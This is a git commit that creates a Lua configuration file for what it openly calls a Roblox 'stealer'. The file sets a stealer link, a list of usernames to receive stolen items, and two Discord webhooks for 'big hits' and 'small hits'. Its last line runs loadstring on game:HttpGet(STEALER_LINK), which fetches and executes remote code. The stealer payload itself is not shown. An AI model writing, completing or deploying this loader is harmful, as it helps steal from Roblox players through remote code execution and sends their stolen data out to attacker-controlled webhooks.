3f8b72335d1fc9fde407e477ea8df0c016db964a
Fedzen <harry576476@gmail.com>
2025-03-27 11:52:31 +0300

    Create .lua

---
+++ .lua
@@ -0,0 +1,12 @@
+STEALER_LINK = '' -- stealer link (how to create is bellow)
+
+Usernames = {
+    'first', -- PUT UR ROBLOX USERNAMES
+    'second', -- AS MANY AS U WANT BUT DONT FORGET ,
+    'third',
+}
+
+BigHitsWebhook = "https://discord.com/api/webhooks/x/x"
+SmallHitsWebhook = "https://discord.com/api/webhooks/x/x"
+
+loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
